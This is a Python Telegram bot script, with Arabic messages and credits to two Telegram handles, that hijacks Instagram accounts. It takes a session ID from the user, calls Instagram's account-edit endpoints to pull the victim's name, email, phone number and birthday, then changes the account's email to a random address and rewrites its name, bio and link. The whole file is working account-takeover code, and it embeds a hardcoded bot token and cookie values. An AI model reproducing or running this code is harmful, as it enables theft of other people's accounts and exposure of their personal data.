import time
import requests
import random
import telebot
from time import sleep
e=0
h=0
token = "5445159489:AAEPxvE2MioDdmHEfJQwqAmGMxYHfyfivis"
bot = telebot.TeleBot(token)
@bot.message_handler(commands = ['greet','start'])
def start(message):
	#mes="اهلا بك في بوت سحب الحسابات عن طريق سيشن ايدي\n\nBY : @MVMVP - @W_Y67"
	#bot.send_message(message.chat.id, mes)
	bot.send_message(message.chat.id, f"ارسل الان سيشن ايدي من فضلك\n\n\nBy : @W_Y67 - @MVMVP\n")
	@bot.message_handler(func=lambda followinG:True )
	def com(message):
	    	
	    
	    
	        sid =(message.text)
	        L ='qwepoiuytrewqasdzxcvbnml'
	        A= str(''.join(random.choice(L)for i in range(25)))
	        E= A+"@gmail.com"
	        global e,h,K,sl
	        url =f"https://i.instagram.com/api/v1/accounts/edit/web_form_data/"
	        head11 = {
		        'accept': '*/*',
		        'accept-encoding': 'gzip, deflate, br',
		        'accept-language': 'en-US,en;q=0.9',
		       # 'content-length': '336',
		        'content-type': 'application/x-www-form-urlencoded',
		        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={sid}',
		       # 'origin': 'https://www.instagram.com',
		        'referer': 'https://www.instagram.com/explore/search/',
		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		        'sec-ch-ua-mobile': '?0',
		        'sec-fetch-dest': 'empty',
		        'sec-fetch-mode': 'cors',
		        'sec-fetch-site': 'same-origin',
		        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
		        'x-asbd-id': '437806',
		        'x-csrftoken': 'rKo9r63bfIf6qgv19TlLP6x7uuDn2o5a',
		        'x-ig-app-id': '936619743392459',
		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
		        #x-requested-with': 'caee87137ae9',
		        'x-requested-with': 'XMLHttpRequest'
	        }
	        try:
	        	y= requests.get(url,headers=head11).json()
	        except requests.exceptions.JSONDecodeError as error:
	        	bot.send_message(message.chat.id, f"سيشن ايدي خطأ..! ")
	        	exit()
	        
	        
	        
	        	
	      
	        da = str(y['form_data']['first_name'])
	        n = str(y['form_data']['email'])
	        u= str(y['form_data']['username'])
	        p= str(y['form_data']['phone_number'])
	        b= str(y['form_data']['birthday'])
	        bot.send_message(message.chat.id, f"Name :{da}\nUsername : {u}\nEmail : {n}\nPhone Number : {p}\nOld Account :   {b}𓉆\n\nBY : @MVMVP - @W_Y67")
	        
	        url1=f"https://www.instagram.com/accounts/edit/?__d=dis"
	        head1 = {
		        'accept': '*/*',
		        'accept-encoding': 'gzip, deflate, br',
		        'accept-language': 'en-US,en;q=0.9',
		       # 'content-length': '336',
		        'content-type': 'application/x-www-form-urlencoded',
		        'cookie': f'mid=YF55GAALAAF55lDR3NkHNG4S-vjw; ig_did=F3A1F3B5-01DB-457B-A6FA-6F83AD1717DE; ig_nrcb=1; shbid=13126; shbts=1616804137.1316793; rur=PRN; ig_direct_region_hint=ATN; csrftoken=ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2; ds_user_id=46165248972; sessionid={sid}',
		       # 'origin': 'https://www.instagram.com',
		        'referer': 'https://www.instagram.com/explore/search/',
		        'sec-ch-ua': '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
		        'sec-ch-ua-mobile': '?0',
		        'sec-fetch-dest': 'empty',
		        'sec-fetch-mode': 'cors',
		        'sec-fetch-site': 'same-origin',
		        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36',
		        'x-asbd-id': '437806',
		        'x-csrftoken': 'ot7HDQ6ZX2EPbVQe1P9Nqvm1WmMkzKn2',
		        'x-ig-app-id': '936619743392459',
		        'x-ig-www-claim': 'hmac.AR2oFTCuitCzXvttHXW3DD1kZLwzL7oauskQL1Jp6ogO6FF6',
		        #x-requested-with': 'caee87137ae9',
		        'x-requested-with': 'XMLHttpRequest'
	        }
	        dat1 = {
			                    'first_name': 'Zaid',
			                    'email': f'{E}',
			                    'username': f'{u}',
			                    'phone_number': '',
			                    'biography': '@gzik',
			                    
			                    'external_url': 'https://t.me/W_Y67',
			                    'chaining_enabled': 'on'
	        }
	        rt = requests.post(url1,headers=head1,data=dat1).text
	        #print(rt)
	        if ('"status":"ok"') in rt:
	        	bot.send_message(message.chat.id, f"Name :{da}\nUsername : {u}\nEmail New  : {E}\nPhone Number : {p}\nOld Account :   {b}𓉆\n\nBY : @MVMVP - @W_Y67")
	        else:
	        	print('')
	   
				
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
	       print(e)
	       sleep(10)
        
